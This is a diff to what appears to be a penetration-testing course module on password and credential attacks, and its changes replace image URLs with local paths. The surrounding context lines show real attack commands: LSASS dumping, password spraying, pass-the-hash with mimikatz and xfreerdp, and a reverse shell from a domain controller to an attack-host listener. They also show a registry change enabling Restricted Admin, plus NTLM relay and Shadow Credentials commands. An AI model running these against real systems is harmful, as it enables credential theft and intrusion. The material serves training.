@@ -1065,7 +1065,7 @@ After successfully cracking the password, we can access the encrypted drive.
 
 The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the `.vhd` file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.
 
-![File Explorer showing folders and drives. BitLocker prompt for drive E: asks for a password to unlock.](https://academy.hackthebox.com/storage/modules/308/img/bitlocker.png)
+![File Explorer showing folders and drives. BitLocker prompt for drive E: asks for a password to unlock.](images/module-147-001.png)
 
 #### Mounting BitLocker-encrypted drives in Linux (or macOS)
 
@@ -1390,7 +1390,7 @@ New Certificate details:
 Do you trust the above certificate? (Y/T/N) Y
 ```
 
-![Windows Control Panel displaying various settings like Administrative Tools, Device Manager, and User Accounts.](https://academy.hackthebox.com/storage/modules/308/img/RDP.png)
+![Windows Control Panel displaying various settings like Administrative Tools, Device Manager, and User Accounts.](images/module-147-002.png)
 
 ## SMB
 
@@ -1615,7 +1615,7 @@ The [Windows client authentication process](https://docs.microsoft.com/en-us/win
 The security subsystem maintains security policies and user accounts on a computer system. On a Domain Controller, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.
 
 #### Windows authentication process diagram
-![Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos.](https://academy.hackthebox.com/storage/modules/308/img/Auth_process1.png)
+![Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos.](images/module-147-004.png)
 
 Local interactive logon is handled through the coordination of several components: the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), credential providers, the Local Security Authority Subsystem Service (`LSASS`), one or more authentication packages, and either the Security Accounts Manager (`SAM`) or Active Directory. Authentication packages, in this context, are Dynamic-Link Libraries (DLLs) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the `Msv1_0.dll` authentication package is typically used.
 
@@ -1661,7 +1661,7 @@ To improve protection against offline cracking of the SAM database, Microsoft in
 
 #### Credential Manager
 
-![Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, WinLogon, and Local Security Authority.](https://academy.hackthebox.com/storage/modules/308/img/authn_credman_credprov.png)
+![Diagram of Windows logon process showing interactions between user input, Logon UI, Credential Provider, WinLogon, and Local Security Authority.](images/module-147-003.png)
 <div class="card bg-light">
     <div class="card-body">
 				 <p class="mb-0">Source: <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Docs</a>.</p>
@@ -2002,7 +2002,7 @@ Practice the techniques taught in this section while you work to complete the ch
 
 In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). As covered in the `Credential Storage` section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.
 
-![Diagram of Windows authentication process showing interactions between WinLogon.exe, lsass.exe, authentication packages, NTLM, and Kerberos.](https://academy.hackthebox.com/storage/modules/308/img/lsassexe_diagram.png)
+![Diagram of Windows authentication process showing interactions between WinLogon.exe, lsass.exe, authentication packages, NTLM, and Kerberos.](images/module-147-006.png)
 
 Upon initial logon, LSASS will: 
 
@@ -2028,7 +2028,7 @@ With access to an interactive graphical session on the target, we can use task m
 4. Select `Create dump file`
 
 
-![Task Manager showing Local Security Authority Process with right-click menu open, highlighting 'Create dump file' option, and lsass.DMP file in search results.](https://academy.hackthebox.com/storage/modules/308/img/taskmanagerdump.png)
+![Task Manager showing Local Security Authority Process with right-click menu open, highlighting 'Create dump file' option, and lsass.DMP file in search results.](images/module-147-005.png)
 
 A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host. 
 
@@ -2277,7 +2277,7 @@ Microsoft often refers to the protected stores as `Credential Lockers` (formerly
 | Web Credentials     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.                                                 |
 | Windows Credentials | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
 
-![Credential Manager showing Windows and Generic Credentials with modification dates. No certificate-based credentials.](https://academy.hackthebox.com/storage/modules/308/img/CredMan_1.png)
+![Credential Manager showing Windows and Generic Credentials with modification dates. No certificate-based credentials.](images/module-147-009.png)
 
 It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
 
@@ -2285,7 +2285,7 @@ It is possible to export Windows Vaults to `.crd` files either via Control Panel
 C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
 ```
 
-![Stored User Names and Passwords window showing a list of credentials with options to add, remove, or edit.](https://academy.hackthebox.com/storage/modules/308/img/CredMan_2.png)
+![Stored User Names and Passwords window showing a list of credentials with options to add, remove, or edit.](images/module-147-008.png)
 
 ## Enumerating credentials with cmdkey
 
@@ -2327,7 +2327,7 @@ C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
 Attempting to start cmd as user "SRV01\mcharles" ...
 ```
 
-![Command Prompt showing user information and domain details. "whoami" command executed, displaying "srv01\mcharles".](https://academy.hackthebox.com/storage/modules/308/img/CredMan_3.png)
+![Command Prompt showing user information and domain details. "whoami" command executed, displaying "srv01\mcharles".](images/module-147-007.png)
 
 ## Extracting credentials with Mimikatz
 
@@ -2383,7 +2383,7 @@ In this section, we will focus primarily on how we can extract credentials throu
 
 Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (`3389`) or other protocols used for remote access on their [edge router](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.
 
-![Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services.](https://academy.hackthebox.com/storage/modules/308/img/ADauthentication_diagram.png)
+![Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services.](images/module-147-011.png)
 
 Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`. That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01\nameofuser`) or with direct access to the device then typing `.\` at the logon UI in the `Username` field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).
 
@@ -2565,7 +2565,7 @@ SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bw
 In this example, NetExec is using SMB to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing. 
 
 #### Event logs from the attack
-![Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details.](https://academy.hackthebox.com/storage/modules/308/img/events_dc.png)
+![Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details.](images/module-147-010.png)
 
 It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.
 
@@ -2844,7 +2844,7 @@ Let's use some of these key terms to search on the IT admin's workstation.
 
 With access to the GUI, it is worth attempting to use `Windows Search` to find files on the target using some of the keywords mentioned above.
 
-![Windows search for 'pass' showing 'Change your password' in system settings and related options.](https://academy.hackthebox.com/storage/modules/308/img/WindowsSearch.png)
+![Windows search for 'pass' showing 'Change your password' in system settings and related options.](images/module-147-012.png)
 
 By default, it will search various OS settings and the file system for files and applications containing the key term entered in the search bar. 
 
@@ -3567,11 +3567,11 @@ The table below lists several common protocols alongside their encrypted counter
 
 For example, in the image below we are filtering for unencrypted `HTTP` traffic.
 
-![Network packet capture showing HTTP requests with source, destination, protocol, length, and info details.](https://academy.hackthebox.com/storage/modules/308/img/Net_2.png)
+![Network packet capture showing HTTP requests with source, destination, protocol, length, and info details.](images/module-147-014.png)
 
 In Wireshark, it's possible to locate packets that contain specific bytes or strings. One way to do this is by using a display filter such as `http contains "passw"`. Alternatively, you can navigate to `Edit > Find Packet` and enter the desired search query manually. For example, you might search for packets containing the string `"passw"`:
 
-![Network packet capture showing HTTP requests with details. Highlighted POST request includes HTML form data with username and password fields.](https://academy.hackthebox.com/storage/modules/308/img/Net_3.png)
+![Network packet capture showing HTTP requests with details. Highlighted POST request includes HTML form data with username and password fields.](images/module-147-013.png)
 
 It's worth familiarizing yourself with the syntax of Wireshark's filtering engine, especially if you ever need to perform network traffic analysis.
 
@@ -3698,7 +3698,7 @@ All of the tools covered in this section output a `large amount of information`.
 
 Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an `HTML report` upon completion, providing an easy-to-use UI for reviewing the results:
 
-![Summary report from PowerHuntShares showing findings: 5 critical, 0 high, 0 medium, 2 low. Data exposure includes 21 interesting, 2 sensitive, 2 secrets files.](https://academy.hackthebox.com/storage/modules/308/img/Net_1.png)
+![Summary report from PowerHuntShares showing findings: 5 critical, 0 high, 0 medium, 2 low. Data exposure includes 21 interesting, 2 sensitive, 2 secrets files.](images/module-147-015.png)
 
 We can run a basic scan using `PowerHuntShares` like so:
 
@@ -3845,7 +3845,7 @@ NTLM    : 64F12CDDAA88057E06A81B54E73B949B
 
 Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.
 
-![Command prompt showing mimikatz execution with privilege escalation and directory listing commands.](https://academy.hackthebox.com/storage/modules/308/img/pth_julio.jpg)
+![Command prompt showing mimikatz execution with privilege escalation and directory listing commands.](images/module-147-021.jpg)
 
 ## Pass the Hash with PowerShell Invoke-TheHash (Windows)
 
@@ -3887,7 +3887,7 @@ listening on [any] 8001 ...
 
 To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.
 
-![Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.](https://academy.hackthebox.com/storage/modules/308/img/rshellonline.jpg)
+![Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.](images/module-147-020.jpg)
 
 Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).
 
@@ -3901,7 +3901,7 @@ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.ht
 
 The result is a reverse shell connection from the DC01 host (172.16.1.10).
 
-![PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output.](https://academy.hackthebox.com/storage/modules/308/img/pth_invoke_the_hash.jpg)
+![PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output.](images/module-147-019.jpg)
 
 ## Pass the Hash with Impacket (Linux)
 
@@ -3987,7 +3987,7 @@ We can perform an RDP PtH attack to gain GUI access to the target system using t
 There are a few caveats to this attack:
 * `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
 
-![Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.](https://academy.hackthebox.com/storage/modules/308/img/rdp_session-4.png)
+![Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.](images/module-147-018.png)
 
 
 This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command: 
@@ -3997,7 +3997,7 @@ This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_D
 c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-![Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.](https://academy.hackthebox.com/storage/modules/308/img/rdp_session-5.png)
+![Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.](images/module-147-017.png)
 
 Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
 
@@ -4014,7 +4014,7 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ...SNIP...
 ```
 
-![Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz.](https://academy.hackthebox.com/storage/modules/308/img/rdp_session_new.jpg)
+![Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz.](images/module-147-016.jpg)
 
 ## UAC limits Pass the Hash for local accounts
 
@@ -4707,7 +4707,7 @@ Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu
 To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (`LINUX01`) connected to the Domain Controller. This machine is only reachable through `MS01`. To access this machine over SSH, we can connect to `MS01` via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward. If you don't know how to do it, you can read the module [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158).
 
 #### Linux auth from MS01
-![Remote desktop session showing a terminal with Ubuntu system information, including hostname 'MS01', system load, memory usage, and update notifications.](https://academy.hackthebox.com/storage/modules/308/img/linux-auth-from-ms01.jpg)
+![Remote desktop session showing a terminal with Ubuntu system information, including hostname 'MS01', system load, memory usage, and update notifications.](images/module-147-025.jpg)
 
 As an alternative, we created a port forward to simplify the interaction with `LINUX01`. By connecting to port TCP/2222 on `MS01`, we will gain access to port TCP/22 on `LINUX01`. 
 
@@ -4962,7 +4962,7 @@ With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AE
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.
 
-![Password hash cracker interface showing an NTLM hash cracked to 'Password5' with a green result indicating an exact match.](https://academy.hackthebox.com/storage/modules/308/img/crackstation.jpg)
+![Password hash cracker interface showing an NTLM hash cracked to 'Password5' with a green result indicating an exact match.](images/module-147-024.jpg)
 
 As we can see in the image, the password for the user Carlos is `Password5`. We can now log in as Carlos.
 
@@ -5206,12 +5206,12 @@ Reading state information... Done
 ```
 
 #### Default Kerberos v5 realm
-![Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB.](https://academy.hackthebox.com/storage/modules/308/img/kerberos-realm.jpg)
+![Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB.](images/module-147-023.jpg)
 
 The Kerberos servers can be empty.
 
 #### Administrative server for your Kerberos realm
-![Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm.](https://academy.hackthebox.com/storage/modules/308/img/kerberos-server-dc01.jpg)
+![Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm.](images/module-147-022.jpg)
 
 In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values: 
 
@@ -5426,7 +5426,7 @@ I: [check] KCM Kerberos tickets
 
 `ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:
 
-![Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL.](https://academy.hackthebox.com/storage/modules/308/img/PtC_1.png)
+![Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL.](images/module-147-027.png)
 
 Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:
 
@@ -5553,7 +5553,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
 
 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
 
-![Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled "AddKeyCredentialLink."](https://academy.hackthebox.com/storage/modules/308/img/PtC_2.png)
+![Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled "AddKeyCredentialLink."](images/module-147-026.png)
 
 We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:
 
@@ -5697,13 +5697,13 @@ Once the technical aspect is covered, the policy must be communicated to the res
 
 Creating a strong password doesn't have to be difficult. Tools like [PasswordMonster](https://www.passwordmonster.com/) help evaluate the strength of passwords, while [1Password Password Generator](https://1password.com/password-generator/) can generate secure ones.
 
-![Password test showing "CjDC2x\[U" rated as very strong. Contains lowercase, uppercase, numbers, symbols. Estimated crack time: 1 thousand years.](https://academy.hackthebox.com/storage/modules/308/img/strong_password_1.png)
+![Password test showing "CjDC2x\[U" rated as very strong. Contains lowercase, uppercase, numbers, symbols. Estimated crack time: 1 thousand years.](images/module-147-029.png)
 
 The password `CjDC2x[U` was generated by the tool and is considered strong. It would take a long time to crack and is unlikely to be guessed or exposed via password spraying attacks. However, it may be difficult to remember.
 
 We can create strong passwords using ordinary words, phrases, or even lyrics from songs we like. For example, a good password might be `This is my secure password` or `The name of my dog is Popy`. To make these phrases more complex, we can add special characters, such as `()The name of my dog is Popy!`. While such passwords are difficult to guess, we should keep in mind that attackers can use OSINT to learn about us, and we should keep this in mind when creating passwords.
 
-![Password test showing 'The name of my dog is Popy' rated as very strong, estimated crack time 381 trillion years.](https://academy.hackthebox.com/storage/modules/308/img/strong_password_phrase.png)
+![Password test showing 'The name of my dog is Popy' rated as very strong, estimated crack time 381 trillion years.](images/module-147-028.png)
 
 Using this method, we can create and remember several strong passwords. However, as the number grows, it becomes increasingly difficult to manage them all. In the next section, we will explore how using a password manager can help generate and securely store a large number of passwords.
 
@@ -5738,7 +5738,7 @@ A common implementation for cloud password managers involves deriving encryption
 - `Master password hash`: Generated using the master password (and often the master key) to authenticate the user to the cloud service.
 - `Decryption key`: Created using the master key to form a symmetric key, which is then used to decrypt vault items.
 
-![Bitwarden encryption process diagram showing user login, PBKDF2-SHA256 algorithm, master key derivation, and AES-256 bit decryption for vault access.](https://academy.hackthebox.com/storage/modules/308/img/bitwarden_diagram.png)
+![Bitwarden encryption process diagram showing user login, PBKDF2-SHA256 algorithm, master key derivation, and AES-256 bit decryption for vault access.](images/module-147-030.png)
 	
 This is a simplified explanation of how password managers operate. In practice, the implementation is more complex. For deeper insight, refer to the technical documents linked above or watch the [How Password Managers Work – Computerphile](https://www.youtube.com/watch?v=w68BBPDAWr8) video.
 
